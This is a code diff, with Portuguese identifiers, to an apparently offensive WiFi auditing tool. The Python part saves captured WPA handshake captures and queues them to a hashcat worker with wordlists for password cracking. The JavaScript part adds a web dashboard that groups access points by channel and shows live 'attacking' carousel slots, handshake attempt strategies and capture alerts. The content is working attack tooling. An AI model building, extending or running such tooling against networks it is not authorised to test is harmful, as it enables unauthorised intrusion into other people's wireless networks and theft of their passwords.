+        try:
+            shutil.copy(str(cap_file), str(novo_cap))
+        except Exception:
+            novo_cap = cap_file
+        if eng.memoria:
+            try:
+                pcap_persistido = eng.memoria.registrar_handshake(
+                    bssid, ap.get("essid", ""), novo_cap)
+                ap["handshake_path"] = str(pcap_persistido)
+                novo_cap = pcap_persistido
+            except Exception:
+                ap["handshake_path"] = str(novo_cap)
+        else:
+            ap["handshake_path"] = str(novo_cap)
+        ap["handshake_em"] = datetime.now().isoformat()
+        try: emitir("handshake_capturado", bssid=bssid, pcap=str(novo_cap))
+        except Exception: pass
+        eng.ui.success(f"  ✓ Handshake capturado: {bssid} ({ap.get('essid','?')})")
+        # Enfileira no hashcat se já tem wordlists
+        wls = ap.get("crack_wordlists") or []
+        if wls and eng.hashcat_worker:
+            wl_paths: List[Path] = []
+            for w in wls:
+                wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
+                if wp.exists():
+                    wl_paths.append(wp)
+            if wl_paths:
+                ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?",
+                                "wordlists": [p.name for p in wl_paths]}
+                emitir("ap_update", **ap)
+                try:
+                    eng.hashcat_worker.enfileirar(
+                        bssid=bssid, essid=ap.get("essid", ""),
+                        pcapng=Path(ap["handshake_path"]),
+                        perfil=ap.get("crack_perfil", "low"),
+                        wordlists=wl_paths,
+                        contextual=True)
+                except Exception as e:
+                    eng.ui.warn(f"  enfileirar hashcat falhou: {e}")
+        else:
+            ap["crack"] = {"status": "captured_no_wl",
+                            "erro": "handshake pego — configure wordlists",
+                            "progresso": 0.0, "eta": "?"}
+            emitir("ap_update", **ap)
 
 
 # ══════════════════ MEMÓRIA PERSISTENTE ═══════════════════════
@@ -7733,10 +8085,68 @@ function renderZonas(){
     _renderZonasNow();
   }, 80);
 }
+// Estado do carrossel global (atualizado via socket "carrossel_tick")
+let carrosselState = {ativo:false, canal:null, restante_s:0, slot_s:0};
+
+function _agruparPorCanal(bssids, zona){
+  // Retorna array de [{canal, aps:[...]}, ...] ordenado por canal asc.
+  // Dentro de cada grupo, APs ordenados por RSSI mais forte (menos negativo).
+  const grupos = {};
+  bssids.forEach(b=>{
+    const ap = aps[b];
+    if(!ap) return;
+    let ch = ap.canal;
+    if(ch===undefined||ch===null||ch===""||ch==="?") ch = "?";
+    else { try{ ch = parseInt(ch); }catch(e){ ch = "?"; } }
+    const key = String(ch);
+    if(!grupos[key]) grupos[key] = {canal: ch, aps: []};
+    grupos[key].aps.push(ap);
+  });
+  // Ordena APs dentro do grupo por RSSI desc
+  Object.values(grupos).forEach(g=>{
+    g.aps.sort((a,b)=>{
+      const ra = parseFloat(a.rssi)||-200, rb = parseFloat(b.rssi)||-200;
+      return rb - ra;
+    });
+  });
+  // Ordena grupos por canal asc; "?" no final
+  return Object.values(grupos).sort((a,b)=>{
+    if(a.canal==="?") return 1;
+    if(b.canal==="?") return -1;
+    return a.canal - b.canal;
+  });
+}
+
+function _headerCanalHTML(canal, n, zona){
+  const corZona = zona==="verde"?"text-green-400":zona==="vermelha"?"text-red-400":"text-cyan-400";
+  const slotAtivo = (carrosselState.ativo && carrosselState.canal === canal && (zona==="vermelha"||zona==="azul"));
+  const restante = carrosselState.restante_s;
+  const slotTotal = carrosselState.slot_s;
+  let badge = "";
+  if(slotAtivo){
+    badge = `<span class="ml-2 text-[0.6rem] px-2 py-0.5 rounded bg-yellow-900/50 border border-yellow-600 text-yellow-300 blink">🔄 atacando · ${restante}s/${slotTotal}s</span>`;
+  } else if(carrosselState.ativo && (zona==="vermelha"||zona==="azul") && carrosselState.canais_pendentes && carrosselState.canais_pendentes.includes(canal)){
+    badge = `<span class="ml-2 text-[0.6rem] px-2 py-0.5 rounded bg-gray-800 border border-gray-700 text-gray-400">⏳ aguardando</span>`;
+  }
+  const canalLabel = canal==="?" ? "📡 Canal desconhecido" : `📡 Canal ${canal}`;
+  return `<div class="flex items-center justify-between text-xs font-bold uppercase tracking-wider ${corZona} mt-3 mb-1 px-1 border-b border-gray-800/60 pb-0.5">
+    <span>${canalLabel} <span class="text-gray-500 font-normal">— ${n} AP${n>1?"s":""}</span></span>
+    ${badge}
+  </div>`;
+}
+
 function _renderZonasNow(){
   ["verde","vermelha","azul"].forEach(z=>{
     const el = document.getElementById("z-"+z);
-    el.innerHTML = zonas[z].map(bssid=>aps[bssid]?cardHTML(aps[bssid],z):"").join("");
+    const grupos = _agruparPorCanal(zonas[z], z);
+    if(grupos.length === 0){
+      el.innerHTML = "";
+    } else {
+      el.innerHTML = grupos.map(g=>{
+        return _headerCanalHTML(g.canal, g.aps.length, z) +
+               g.aps.map(ap=>cardHTML(ap,z)).join("");
+      }).join("");
+    }
     document.getElementById("cnt-"+z).textContent = zonas[z].length;
   });
   updateChart();
@@ -8355,6 +8765,38 @@ sock.on("ap_descoberto",a=>{
   log(`AP descoberto: ${a.essid||"?"} (${a.bssid}) ${a.crypto||""}`,"ok");
 });
 sock.on("ap_update",a=>{Object.assign(aps[a.bssid]||(aps[a.bssid]={}),a);renderZonas();});
+sock.on("handshake_log",d=>{ log(`🎯 ${d.bssid}: ${d.msg}`,"info"); });
+sock.on("carrossel_status",d=>{
+  carrosselState.ativo = !!d.ativo;
+  if(!d.ativo){
+    carrosselState.canal = null; carrosselState.restante_s = 0;
+    carrosselState.canais_pendentes = [];
+  }
+  renderZonas();
+  log(`🔄 Carrossel ${d.ativo?"iniciado":"parado"}`, d.ativo?"ok":"warn");
+});
+sock.on("carrossel_slot",d=>{
+  log(`🔄 Slot ch${d.canal} · ${d.vermelha} vermelha + ${d.azul} azul · ${d.slot_s}s`,"info");
+});
+sock.on("carrossel_tick",d=>{
+  carrosselState.ativo = !!d.ativo;
+  carrosselState.canal = d.canal;
+  carrosselState.restante_s = d.restante_s;
+  carrosselState.slot_s = d.slot_s;
+  renderZonas();
+});
+sock.on("handshake_tentativa",d=>{
+  if(aps[d.bssid]){
+    aps[d.bssid].crack = aps[d.bssid].crack || {};
+    aps[d.bssid].crack.tentativa = d.tentativa;
+    aps[d.bssid].crack.estrategia = d.estrategia;
+    renderZonas();
+  }
+});
+sock.on("handshake_capturado",d=>{
+  log(`✅ Handshake REAL capturado: ${d.bssid} → ${d.pcap}`,"ok");
+  toast(`✅ Handshake capturado para ${aps[d.bssid]?.essid||d.bssid}`);
+});
 sock.on("pacotes_total",p=>{
   const total = p.total||0;
   const dt = (Date.now()-lastT)/1000;
